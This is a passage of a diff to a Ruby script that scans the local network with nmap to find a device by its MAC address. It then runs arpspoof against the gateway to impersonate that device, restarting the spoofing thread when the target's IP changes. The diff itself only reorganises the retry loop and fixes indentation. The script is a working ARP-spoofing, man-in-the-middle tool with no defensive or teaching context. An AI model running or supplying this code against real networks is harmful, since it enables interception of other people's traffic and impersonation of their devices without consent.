@@ -42,7 +42,7 @@ def till_succeed(cmd,timeout)
     end
     if succeed
       puts "succeed"
-    break
+      break
     end
   end
 rescue Interrupt
@@ -56,27 +56,33 @@ loop do
   i=Socket.getifaddrs.select{|i|i.addr.ipv4? and !i.addr.ipv4_loopback?}.first
   route_ip=till_succeed('route',timeout).split("\n")[2].split(' ')[1]
   netmask=i.netmask.inspect_sockaddr.scan(/\d+/).map(&:to_i).inject(32){|i,j|i-Math.log(256-j,2)}.to_i
-  res=till_succeed("sudo nmap #{route_ip}/#{netmask} -sn",timeout)
-  res<<till_succeed("sudo nmap #{route_ip}/#{netmask} -sn",timeout)
-  if res.include?(mac)
-    res_arr = res.split("\n")
-    for i in 2..res_arr.length-1
-      if res_arr[i].include?(mac)
-        ip=res_arr[i-2].split(' ')[-1]
-        if (current_spoofing_ip == ip and current_spoofing_connection == connection)
-          puts "#{ip} is under spoofing."
-        else
-          spoofing_thread && spoofing_thread.kill
-          puts "start spoofing #{ip}."
-          spoofing_thread = Thread.new do
-            `sudo arpspoof -t #{route_ip} #{ip} 2>/dev/null`
+  include_ip=false
+  2.times do
+    res=till_succeed("sudo nmap #{route_ip}/#{netmask} -sn",timeout)
+    if res.include?(mac)
+      res_arr = res.split("\n")
+      for i in 2..res_arr.length-1
+        if res_arr[i].include?(mac)
+          ip=res_arr[i-2].split(' ')[-1]
+          if (current_spoofing_ip == ip and current_spoofing_connection == connection)
+            puts "#{ip} is under spoofing."
+            break
+          else
+            spoofing_thread && spoofing_thread.kill
+            puts "start spoofing #{ip}."
+            spoofing_thread = Thread.new do
+              `sudo arpspoof -t #{route_ip} #{ip} 2>/dev/null`
+            end
+            current_spoofing_ip=ip
+            current_spoofing_connection=connection
           end
-          current_spoofing_ip=ip
-          current_spoofing_connection=connection
         end
       end
+      include_ip=true;
+      break;
     end
-  else
+  end
+  unless include_ip
     spoofing_thread && spoofing_thread.kill
     connection = connections.shift
     connections.push connection
